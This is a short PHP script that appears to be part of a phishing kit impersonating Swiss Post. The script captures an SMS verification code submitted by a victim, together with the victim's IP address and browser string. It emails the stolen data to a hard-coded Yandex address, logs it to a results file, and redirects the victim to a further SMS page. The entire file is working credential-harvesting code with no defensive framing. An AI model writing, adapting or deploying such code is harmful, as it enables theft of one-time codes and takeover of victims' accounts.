<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[ SWISS POST SMS1]-----++--\n";
$message .= "-------------- BY Mouhib ht-----\n";
$message .= "SMS : ".$_POST['sms']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "----------------------By Yass ht ----------------------\n";
$subject = "SWISS POST SMS1 [ " . $zabi . " ]  ";
$email = "mouhibdarkmalek2004@yandex.com";
mail($email,$subject,$message);
    $text = fopen('../rzlt.txt', 'a');
fwrite($text, $message);

header("Location: ../sms/sms2.html");
?>